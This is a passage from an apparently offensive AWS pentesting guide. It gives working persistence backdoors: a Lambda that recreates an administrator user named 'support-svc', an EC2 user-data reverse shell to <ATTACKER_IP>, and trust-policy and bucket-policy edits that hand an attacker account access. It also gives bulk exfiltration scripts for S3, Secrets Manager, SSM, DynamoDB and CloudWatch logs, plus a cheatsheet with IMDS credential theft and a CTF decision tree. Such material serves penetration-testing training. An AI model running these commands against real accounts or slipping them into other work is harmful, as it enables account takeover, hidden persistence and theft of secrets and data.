  aws sts assume-role --role-arn arn:aws:iam::<VICTIM_ACCOUNT>:role/OrganizationAuditRole --role-session-name audit
  ```

  :::

  :::accordion-item
  ---
  icon: i-lucide-anchor
  label: "Lambda Backdoor (Event-Driven Persistence)"
  ---

  ```bash [Terminal]
  # Create Lambda that re-creates access if deleted
  # Triggered by CloudWatch Events / EventBridge

  cat > /tmp/persistence.py << 'PYEOF'
  import boto3
  def handler(event, context):
      iam = boto3.client('iam')
      try:
          iam.get_user(UserName='support-svc')
      except:
          iam.create_user(UserName='support-svc')
          iam.attach_user_policy(UserName='support-svc', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
          iam.create_access_key(UserName='support-svc')
      return {'statusCode': 200}
  PYEOF

  # Deploy with EventBridge trigger (runs every hour)
  # This automatically recreates the backdoor user if deleted
  ```

  :::

  :::accordion-item
  ---
  icon: i-lucide-anchor
  label: "EC2 Instance with Reverse Shell"
  ---

  ```bash [Terminal]
  # Launch EC2 instance with user data that creates reverse shell
  aws ec2 run-instances \
    --image-id ami-0c55b159cbfafe1f0 \
    --instance-type t2.micro \
    --iam-instance-profile Name=AdminProfile \
    --user-data '#!/bin/bash
  bash -i >& /dev/tcp/<ATTACKER_IP>/443 0>&1' \
    --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=monitoring-agent}]'
  ```

  :::

  :::accordion-item
  ---
  icon: i-lucide-anchor
  label: "Modify Existing Trust Policies"
  ---

  ```bash [Terminal]
  # Add your account to existing role's trust policy
  # Get current trust policy
  aws iam get-role --role-name ExistingAdminRole --query 'Role.AssumeRolePolicyDocument' > trust.json

  # Modify to add your account
  # Add: {"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::<YOUR_ACCOUNT>:root"},"Action":"sts:AssumeRole"}

  aws iam update-assume-role-policy --role-name ExistingAdminRole --policy-document file://trust.json
  ```

  :::

  :::accordion-item
  ---
  icon: i-lucide-anchor
  label: "S3 Bucket Exfiltration Backdoor"
  ---

  ```bash [Terminal]
  # Add replication to your S3 bucket
  # All new objects automatically copied to attacker's bucket

  # Or add bucket policy allowing your account to read
  aws s3api put-bucket-policy --bucket <TARGET_BUCKET> --policy '{
    "Version": "2012-10-17",
    "Statement": [{
      "Sid": "BackdoorAccess",
      "Effect": "Allow",
      "Principal": {"AWS": "arn:aws:iam::<YOUR_ACCOUNT>:root"},
      "Action": "s3:*",
      "Resource": ["arn:aws:s3:::<TARGET_BUCKET>", "arn:aws:s3:::<TARGET_BUCKET>/*"]
    }]
  }'
  ```

  :::

::

### Data Exfiltration

```bash [Terminal]
# ============================================
# S3 DATA EXFILTRATION
# ============================================

# List all buckets and estimate size
for bucket in $(aws s3api list-buckets --query 'Buckets[*].Name' --output text); do
  SIZE=$(aws s3 ls s3://$bucket --recursive --summarize | grep "Total Size" | awk '{print $3}')
  OBJECTS=$(aws s3 ls s3://$bucket --recursive --summarize | grep "Total Objects" | awk '{print $3}')
  echo "$bucket: $OBJECTS objects, $SIZE bytes"
done

# Sync interesting buckets
aws s3 sync s3://target-backup ./exfil/backup/
aws s3 sync s3://target-data ./exfil/data/

# ============================================
# SECRETS EXFILTRATION
# ============================================

# Dump all Secrets Manager secrets
for secret in $(aws secretsmanager list-secrets --query 'SecretList[*].Name' --output text); do
  echo "=== $secret ==="
  aws secretsmanager get-secret-value --secret-id $secret --query 'SecretString' --output text 2>/dev/null
done > secrets_dump.txt

# Dump all SSM parameters
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption --query 'Parameters[*].[Name,Value]' --output text > ssm_dump.txt

# ============================================
# DATABASE EXFILTRATION
# ============================================

# DynamoDB table dump
for table in $(aws dynamodb list-tables --query 'TableNames' --output text); do
  aws dynamodb scan --table-name $table > "dynamodb_${table}.json"
done

# ============================================
# CLOUDWATCH LOGS (May contain secrets)
# ============================================
for group in $(aws logs describe-log-groups --query 'logGroups[*].logGroupName' --output text); do
  aws logs filter-log-events --log-group-name $group --filter-pattern "password" --max-items 100 > "logs_${group//\//_}.json" 2>/dev/null
done
```

---

## Automated Enumeration Tools

::card-group

  ::card
  ---
  title: "Pacu"
  icon: i-lucide-terminal
  to: https://github.com/RhinoSecurityLabs/pacu
  target: _blank
  ---
  **The AWS Exploitation Framework.** Enumerate, escalate, exfiltrate. Modules for IAM, S3, EC2, Lambda, secrets, and more.
  ```bash
  pip3 install pacu && pacu
  ```
  ::

  ::card
  ---
  title: "ScoutSuite"
  icon: i-lucide-search
  to: https://github.com/nccgroup/ScoutSuite
  target: _blank
  ---
  **Multi-cloud security auditing tool.** Generates comprehensive HTML reports of misconfigurations.
  ```bash
  scout aws --profile stolen
  ```
  ::

  ::card
  ---
  title: "Prowler"
  icon: i-lucide-shield-check
  to: https://github.com/prowler-cloud/prowler
  target: _blank
  ---
  **AWS security best practices assessment.** 300+ checks against CIS, PCI-DSS, HIPAA.
  ```bash
  prowler aws -p stolen
  ```
  ::

  ::card
  ---
  title: "enumerate-iam"
  icon: i-lucide-list
  to: https://github.com/andresriancho/enumerate-iam
  target: _blank
  ---
  **Brute-force IAM permissions.** Tests every AWS API call to determine what the credential can do.
  ```bash
  python3 enumerate-iam.py --access-key AKIA... --secret-key ...
  ```
  ::

  ::card
  ---
  title: "CloudMapper"
  icon: i-lucide-map
  to: https://github.com/duo-labs/cloudmapper
  target: _blank
  ---
  **AWS network visualization.** Maps VPCs, security groups, and identifies exposed services.
  ```bash
  python3 cloudmapper.py collect --account my_account
  python3 cloudmapper.py report --account my_account
  ```
  ::

  ::card
  ---
  title: "Steampipe"
  icon: i-lucide-database
  to: https://github.com/turbot/steampipe
  target: _blank
  ---
  **Query cloud infrastructure with SQL.** Powerful for custom enumeration queries.
  ```bash
  steampipe query "select * from aws_iam_user"
  ```
  ::

::

---

## Common Misconfigurations Checklist

::card-group

  ::card
  ---
  title: "Public S3 Buckets"
  icon: i-lucide-globe
  color: red
  ---
  S3 buckets with public ACLs or bucket policies allowing `*` principal.

  **Check:** `aws s3api get-bucket-acl` + `get-bucket-policy`

  **Impact:** Data breach, sensitive information exposure
  ::

  ::card
  ---
  title: "Overprivileged IAM Users/Roles"
  icon: i-lucide-shield-off
  color: red
  ---
  Users or roles with `*:*` (admin) permissions or excessive policies.

  **Check:** `pmapper analysis` or policy review

  **Impact:** Full account compromise from single credential
  ::

  ::card
  ---
  title: "Exposed Access Keys"
  icon: i-lucide-key
  color: red
  ---
  AWS access keys committed to GitHub, config files, or environment variables.

  **Check:** `trufflehog`, `gitleaks`, GitHub search

  **Impact:** Complete AWS account takeover
  ::

  ::card
  ---
  title: "IMDSv1 Enabled"
  icon: i-lucide-server
  color: red
  ---
  EC2 instances using Instance Metadata Service v1 (no token required).

  **Check:** Instance metadata options

  **Impact:** SSRF → credential theft → account compromise
  ::

  ::card
  ---
  title: "Security Groups — 0.0.0.0/0"
  icon: i-lucide-unlock
  color: red
  ---
  Security groups allowing inbound traffic from anywhere on sensitive ports.

  **Check:** `aws ec2 describe-security-groups`

  **Impact:** Unauthorized access to services
  ::

  ::card
  ---
  title: "Public RDS/Redshift"
  icon: i-lucide-database
  color: red
  ---
  Databases with `PubliclyAccessible: true` and open security groups.

  **Check:** `aws rds describe-db-instances`

  **Impact:** Direct database access from internet
  ::

  ::card
  ---
  title: "Unencrypted Data"
  icon: i-lucide-lock-open
  color: red
  ---
  S3 buckets, EBS volumes, RDS instances without encryption at rest.

  **Check:** Encryption settings on each service

  **Impact:** Data exposure if storage is compromised
  ::

  ::card
  ---
  title: "No MFA on Root/Admin"
  icon: i-lucide-shield-alert
  color: red
  ---
  Root account or admin users without Multi-Factor Authentication.

  **Check:** `aws iam get-credential-report`

  **Impact:** Account takeover via password compromise
  ::

  ::card
  ---
  title: "CloudTrail Disabled"
  icon: i-lucide-eye-off
  color: red
  ---
  No CloudTrail logging or not covering all regions.

  **Check:** `aws cloudtrail describe-trails`

  **Impact:** No audit trail, attackers operate undetected
  ::

  ::card
  ---
  title: "Lambda Environment Secrets"
  icon: i-lucide-code
  color: red
  ---
  Lambda functions with credentials stored in plaintext environment variables.

  **Check:** `aws lambda get-function-configuration`

  **Impact:** Credential theft from function configuration
  ::

  ::card
  ---
  title: "Public EBS Snapshots/AMIs"
  icon: i-lucide-hard-drive
  color: red
  ---
  EBS snapshots or AMIs shared publicly containing sensitive data.

  **Check:** `aws ec2 describe-snapshots --restorable-by-user-ids all`

  **Impact:** Data breach from snapshot restoration
  ::

  ::card
  ---
  title: "Cross-Account Role Trust"
  icon: i-lucide-users
  color: red
  ---
  IAM roles with overly broad trust policies allowing unknown accounts.

  **Check:** `aws iam get-role --query AssumeRolePolicyDocument`

  **Impact:** Unauthorized cross-account access
  ::

::

---

## Quick Reference Cheatsheet

::field-group

  ::field{name="Verify Identity" type="command"}
  `aws sts get-caller-identity`
  ::

  ::field{name="List Users" type="command"}
  `aws iam list-users`
  ::

  ::field{name="List Roles" type="command"}
  `aws iam list-roles`
  ::

  ::field{name="List Groups" type="command"}
  `aws iam list-groups`
  ::

  ::field{name="Get User Policies" type="command"}
  `aws iam list-attached-user-policies --user-name <USER>`
  ::

  ::field{name="List Buckets" type="command"}
  `aws s3 ls`
  ::

  ::field{name="List Bucket Contents" type="command"}
  `aws s3 ls s3://<BUCKET> --recursive`
  ::

  ::field{name="Public Bucket Check" type="command"}
  `aws s3 ls s3://<BUCKET> --no-sign-request`
  ::

  ::field{name="List EC2 Instances" type="command"}
  `aws ec2 describe-instances`
  ::

  ::field{name="Get User Data" type="command"}
  `aws ec2 describe-instance-attribute --instance-id <ID> --attribute userData`
  ::

  ::field{name="List Lambdas" type="command"}
  `aws lambda list-functions`
  ::

  ::field{name="Get Lambda Env Vars" type="command"}
  `aws lambda get-function-configuration --function-name <NAME>`
  ::

  ::field{name="List Secrets" type="command"}
  `aws secretsmanager list-secrets`
  ::

  ::field{name="Get Secret Value" type="command"}
  `aws secretsmanager get-secret-value --secret-id <NAME>`
  ::

  ::field{name="SSM Parameters" type="command"}
  `aws ssm get-parameters-by-path --path "/" --recursive --with-decryption`
  ::

  ::field{name="List RDS" type="command"}
  `aws rds describe-db-instances`
  ::

  ::field{name="Security Groups" type="command"}
  `aws ec2 describe-security-groups`
  ::

  ::field{name="CloudTrail Status" type="command"}
  `aws cloudtrail describe-trails`
  ::

  ::field{name="Assume Role" type="command"}
  `aws sts assume-role --role-arn <ARN> --role-session-name hacked`
  ::

  ::field{name="IMDS Creds (SSRF)" type="command"}
  `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`
  ::

  ::field{name="Credential Report" type="command"}
  `aws iam generate-credential-report && aws iam get-credential-report`
  ::

  ::field{name="Password Policy" type="command"}
  `aws iam get-account-password-policy`
  ::

  ::field{name="Enumerate Permissions" type="command"}
  `python3 enumerate-iam.py --access-key AKIA... --secret-key ...`
  ::

  ::field{name="Full Audit (ScoutSuite)" type="command"}
  `scout aws --profile stolen`
  ::

  ::field{name="Privesc Scan (Pacu)" type="command"}
  `pacu → run iam__privesc_scan`
  ::

::

---

## Tools Summary

| Tool | Category | Purpose |
| ---- | -------- | ------- |
| `aws cli` | Core | Official AWS command-line interface |
| `pacu` | Exploitation | AWS exploitation framework (enumerate, escalate, persist) |
| `scoutsuite` | Audit | Multi-cloud security assessment with HTML reports |
| `prowler` | Audit | 300+ CIS/PCI-DSS/HIPAA security checks |
| `enumerate-iam` | Enumeration | Brute-force IAM permission discovery |
| `pmapper` | Analysis | IAM privilege escalation path analysis |
| `cloudsplaining` | Analysis | IAM policy risk assessment |
| `cloudmapper` | Network | AWS network visualization and analysis |
| `steampipe` | Query | SQL-based cloud infrastructure querying |
| `trufflehog` | OSINT | Secret/credential scanner in repos |
| `gitleaks` | OSINT | Git repository secret scanner |
| `s3scanner` | S3 | S3 bucket discovery and enumeration |
| `cloud_enum` | Discovery | Multi-cloud resource enumeration |
| `lazys3` | S3 | S3 bucket brute force discovery |
| `bucket-finder` | S3 | S3 bucket discovery by keyword |
| `awspx` | Visualization | AWS attack path graph visualization |
| `cloudfox` | Enumeration | Find exploitable attack paths in AWS |
| `weirdAAL` | Enumeration | AWS Attack Library |
| `s3-inspector` | S3 | S3 bucket permission checker |
| `crt.sh` | OSINT | Certificate transparency for domain discovery |
| `waybackurls` | OSINT | Historical URL discovery |
| `theHarvester` | OSINT | Email and domain discovery |

---

## CTF / Exam Quick Reference

```text [Decision Tree]
FOUND AWS CREDENTIALS?
│
├── VERIFY IDENTITY
│   └── aws sts get-caller-identity → Account ID, User/Role ARN
│
├── ENUMERATE PERMISSIONS
│   ├── enumerate-iam.py → What API calls work?
│   ├── pacu → iam__enum_permissions
│   └── Manual: try iam, s3, ec2, lambda, secretsmanager commands
│
├── CHECK FOR QUICK WINS
│   ├── aws secretsmanager list-secrets → GET SECRET VALUES
│   ├── aws ssm get-parameters-by-path --with-decryption → PARAMETERS
│   ├── aws s3 ls → CHECK ALL BUCKETS
│   ├── aws lambda list-functions → CHECK ENV VARS & CODE
│   ├── aws ec2 describe-instances → USER DATA (base64)
│   └── aws rds describe-db-instances → DATABASE ACCESS
│
├── PRIVILEGE ESCALATION
│   ├── Can create policy version? → Admin policy
│   ├── Can attach policy? → AdministratorAccess
│   ├── Can create user/keys? → Backdoor user
│   ├── Can assume role? → Find admin role
│   ├── Can create lambda + passRole? → Code exec as admin role
│   └── pacu → iam__privesc_scan
│
├── LATERAL MOVEMENT
│   ├── Found DB credentials → Connect to RDS
│   ├── Found SSH keys → Access EC2
│   ├── Found other AWS keys → Pivot to other accounts
│   └── Cross-account roles → Assume into other accounts
│
└── NO CREDENTIALS? (External Recon)
    ├── S3 bucket brute force → cloud_enum, s3scanner
    ├── GitHub secret scanning → trufflehog, gitleaks
    ├── DNS enumeration → AWS service identification
    ├── SSRF → http://169.254.169.254/ → STEAL CREDS
    ├── Public snapshots/AMIs → Data exposure
    └── Certificate transparency → Subdomain discovery
```

---

## Additional Resources

::card-group

  ::card
  ---
  title: "AWS Security Documentation"
  icon: i-lucide-book-open
  to: https://docs.aws.amazon.com/security/
  target: _blank
  ---
  Official AWS security best practices and configuration guides.
  ::

  ::card
  ---
  title: "HackTricks Cloud — AWS"
  icon: i-lucide-book-open
  to: https://cloud.hacktricks.xyz/pentesting-cloud/aws-security
  target: _blank
  ---
  Community cloud pentesting reference for AWS attacks and enumeration.
  ::

  ::card
  ---
  title: "flAWS / flAWS2 Challenges"
  icon: i-lucide-flag
  to: http://flaws.cloud
  target: _blank
  ---
  Hands-on AWS security challenges for learning common misconfigurations.
  ::

  ::card
  ---
  title: "CloudGoat — Vulnerable AWS Lab"
  icon: i-lucide-server
  to: https://github.com/RhinoSecurityLabs/cloudgoat
  target: _blank
  ---
  Rhino Security Labs' "Vulnerable by Design" AWS deployment for practice.
  ::

  ::card
  ---
  title: "Rhino Security Labs Blog"
  icon: i-lucide-book-open
  to: https://rhinosecuritylabs.com/blog/
  target: _blank
  ---
  Research on AWS privilege escalation, attack techniques, and Pacu updates.
  ::

  ::card
  ---
  title: "IAM Vulnerable (Practice Lab)"
  icon: i-lucide-beaker
  to: https://github.com/BishopFox/iam-vulnerable
  target: _blank
  ---
  Bishop Fox's intentionally vulnerable IAM environment for privesc practice.
  ::

::